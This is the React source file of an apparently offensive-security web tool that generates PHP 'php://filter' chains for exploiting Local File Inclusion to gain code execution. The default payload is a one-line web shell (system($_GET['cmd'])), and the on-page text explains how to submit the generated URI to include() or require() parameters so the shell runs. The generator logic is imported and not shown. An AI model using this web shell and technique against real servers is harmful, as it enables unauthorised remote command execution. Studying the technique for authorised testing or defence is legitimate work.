import React, { useState } from 'react';
import { generatePHPFilterChain } from '../../logic/toolLogic';
import { CodeBlock } from '../../components/CodeBlock';
import { Info } from 'lucide-react';

export const PHPFilterChainTool: React.FC = () => {
  const [payload, setPayload] = useState('<?php system($_GET["cmd"]); ?>');
  const [chain, setChain] = useState('');

  const handleGenerate = () => {
    const res = generatePHPFilterChain(payload);
    setChain(res);
  };

  return (
    <div className="space-y-8">
      <div className="p-4 bg-indigo-500/5 border border-indigo-500/20 rounded-xl flex gap-4">
        <Info className="w-5 h-5 text-indigo-400 shrink-0 mt-0.5" />
        <p className="text-[13px] text-indigo-300/70 leading-relaxed font-medium tracking-tight">
          This generator builds a massive <code>php://filter</code> URI using <code>iconv</code> charset conversions to assemble a payload in memory. This is a critical tactic for exploiting Local File Inclusion (LFI) when no file upload capability is present.
        </p>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-10">
        <div className="lg:col-span-1 space-y-6">
          <div className="space-y-2">
            <label className="text-[10px] font-bold text-white/40 uppercase tracking-[0.2em]">Target PHP Payload</label>
            <textarea 
              className="w-full h-56 bg-[#0a0f16]/60 border border-white/5 rounded-xl p-4 font-mono text-sm text-[#9fef00] focus:outline-none focus:ring-1 focus:ring-[#9fef00]/40 transition-all resize-none"
              value={payload}
              onChange={(e) => setPayload(e.target.value)}
              placeholder="<?php system('id'); ?>"
            />
          </div>
          <button 
            onClick={handleGenerate}
            className="w-full py-4 bg-[#9fef00] text-black font-bold rounded-xl hover:shadow-[0_0_30px_rgba(159,239,0,0.3)] transition-all uppercase tracking-[0.2em] text-[11px] hover:scale-[1.01] active:scale-[0.99]"
          >
            Construct Filter Chain
          </button>
        </div>

        <div className="lg:col-span-2 space-y-5">
          <label className="text-[10px] font-bold text-white/40 uppercase tracking-[0.2em]">Generated Inclusion URI</label>
          {chain ? (
            <div className="animate-in fade-in slide-in-from-right-2 duration-500 space-y-4">
               <CodeBlock code={chain} language="bash" title="php://filter-chain" />
               <div className="p-5 rounded-xl border border-white/5 bg-white/[0.01]">
                  <h4 className="text-[10px] font-bold text-white uppercase tracking-[0.2em] mb-2 text-white/60">Execution Methodology</h4>
                  <p className="text-[12px] text-white/30 leading-relaxed font-medium">
                    Submit this URI to any parameter processed by <code>include()</code>, <code>require()</code>, or <code>file_get_contents()</code>. The PHP engine will process the conversions, effectively decoding your payload into the memory buffer before execution.
                  </p>
               </div>
            </div>
          ) : (
            <div className="h-72 flex flex-col items-center justify-center border border-dashed border-white/10 rounded-xl bg-white/[0.01]">
               <div className="w-10 h-10 rounded-full border border-white/5 mb-3 flex items-center justify-center">
                  <div className="w-1.5 h-1.5 rounded-full bg-white/20 animate-pulse" />
               </div>
               <p className="text-white/20 text-xs font-bold uppercase tracking-widest">Awaiting payload briefing...</p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};